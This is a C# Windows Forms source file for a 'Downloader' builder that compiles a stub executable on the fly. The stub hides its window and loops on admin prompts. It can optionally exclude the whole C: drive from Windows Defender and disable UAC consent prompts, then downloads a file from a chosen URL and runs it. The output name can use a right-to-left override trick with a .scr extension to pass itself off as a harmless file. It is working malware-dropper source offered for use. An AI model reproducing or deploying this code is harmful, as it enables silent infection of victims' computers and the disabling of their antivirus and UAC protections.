using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.IO;
using System.Windows.Forms.Design;

namespace Downloader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            guna2ComboBox1.SelectedItem = "No";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void guna2CheckBox9_CheckedChanged(object sender, EventArgs e)
        {
            guna2TextBox3.Enabled = guna2CheckBox9.Checked;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string name;

            if (guna2CheckBox9.Checked)
            {
                name = "‮" + guna2TextBox3.Text + ".ScR";
            }
            else
            {
                name = "Output.exe";
            }

            string outputFileName = name;
            string fileName = "";

            if (guna2CheckBox1.Checked)
            {
                fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), guna2TextBox2.Text);
            }
            if (guna2CheckBox2.Checked)
            {
                fileName = Path.Combine(Path.GetTempPath(), guna2TextBox2.Text);
            }

            string url = guna2TextBox1.Text;
            string runas = guna2ComboBox1.SelectedItem.ToString() == "Yes" ? "runas" : "";

            string codeToCompile = $@"
using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Principal;
using System.Windows.Forms;
using System.Threading;

class Program
{{
    [DllImport(""shell32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

        [DllImport(""kernel32.dll"")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport(""kernel32.dll"")]
    public static extern bool AllocConsole();

    [DllImport(""kernel32.dll"")]
    public static extern bool FreeConsole();

    const int SW_HIDE = 0;

    static void Main()
    {{

        IntPtr consoleWindow = GetConsoleWindow();
        if (consoleWindow != IntPtr.Zero)
        {{
            FreeConsole();
        }}

        string fileName = @""{fileName}"";

        if ({(guna2ComboBox1.SelectedItem.ToString() == "Yes" ? "true" : "false")})
        {{
            bool isAdmin = false;
            do
            {{
                WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);

                if (!isAdmin)
                {{
                    // Request admin privileges and restart the application
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {{
                        FileName = Application.ExecutablePath,
                        Verb = ""runas"",  // Request admin privileges
                        UseShellExecute = true
                    }};

                    try
                    {{
                        Process.Start(startInfo);
                    }}
                    catch (Exception ex)
                    {{
                        // Handle any exceptions if needed
                    }}
                }}

                // Sleep for 1 second before checking again
                System.Threading.Thread.Sleep(1000);
            }} while (!isAdmin);
        }}

        if ({(guna2CheckBox10.Checked ? "true" : "false")})
        {{
            using (Process process = new Process())
            {{
                process.StartInfo.FileName = ""powershell.exe"";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;

                process.Start();

                using (StreamWriter sw = process.StandardInput)
                {{
                    if (sw.BaseStream.CanWrite)
                    {{
                        string powershellCommand = ""Add-MpPreference -ExclusionPath 'C:\\'"";
                        sw.WriteLine(powershellCommand);
                    }}
                }}

                process.WaitForExit();
            }}
        }}

        // Check for and close other instances of the same application
        Process currentProcess = Process.GetCurrentProcess();
        Process[] processes = Process.GetProcessesByName(currentProcess.ProcessName);

        foreach (Process process in processes)
        {{
            if (process.Id != currentProcess.Id)
            {{
                process.CloseMainWindow(); // Close the main window if it exists
                process.WaitForExit(1000); // Wait for up to 5 seconds for the process to exit
                if (!process.HasExited)
                {{
                    process.Kill(); // If it hasn't exited, forcefully terminate the process
                }}
            }}
        }}

        if ({(guna2CheckBox11.Checked ? "true" : "false")})
        {{
            using (Process uacProcess = new Process())
                    {{
                        uacProcess.StartInfo.FileName = ""powershell.exe"";
                        uacProcess.StartInfo.UseShellExecute = false;
                        uacProcess.StartInfo.CreateNoWindow = true;
                        uacProcess.StartInfo.RedirectStandardInput = true;
                        uacProcess.StartInfo.RedirectStandardOutput = true;
                        uacProcess.StartInfo.RedirectStandardError = true;

                        uacProcess.Start();

                        using (StreamWriter sw = uacProcess.StandardInput)
                        {{
                            if (sw.BaseStream.CanWrite)
                            {{
                                string powershellCommand = ""Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0"";
                                sw.WriteLine(powershellCommand);
                            }}
                        }}

                        uacProcess.WaitForExit();
                    }}
        }}

        string remoteUri = @""{url}"";
        using (WebClient client = new WebClient())
        {{
            client.DownloadFile(remoteUri, fileName);
        }}
        if ({(guna2CheckBox7.Checked ? "true" : "false")})
        {{
            int result = ShellExecute(IntPtr.Zero, ""{runas}"", fileName, null, null, 1);
        }}
 if (consoleWindow != IntPtr.Zero)
        {{
            AllocConsole();
        }}
    }}
}}";



            CodeDomProvider codeProvider = new CSharpCodeProvider();

            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = outputFileName;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

            CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, codeToCompile);

            if (results.Errors.Count > 0)
            {
                foreach (CompilerError error in results.Errors)
                {
                    MessageBox.Show($"Error: {error.ErrorText} at line {error.Line}");
                }
            }

            if (guna2CheckBox1.Checked)
            {
                //Still On Development
            }
        }

        private void guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (guna2ComboBox1.SelectedItem.ToString() == "Yes")
            {
                guna2CheckBox10.Enabled = true;
                guna2CheckBox10.Visible = true;
                guna2CheckBox11.Enabled = true;
                guna2CheckBox11.Visible = true;
            }
            else if (guna2ComboBox1.SelectedItem.ToString() == "No")
            {
                guna2CheckBox10.Enabled = false;
                guna2CheckBox10.Visible = false;
                guna2CheckBox11.Enabled = false;
                guna2CheckBox11.Visible = false;
            }
        }

        private void guna2CheckBox8_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
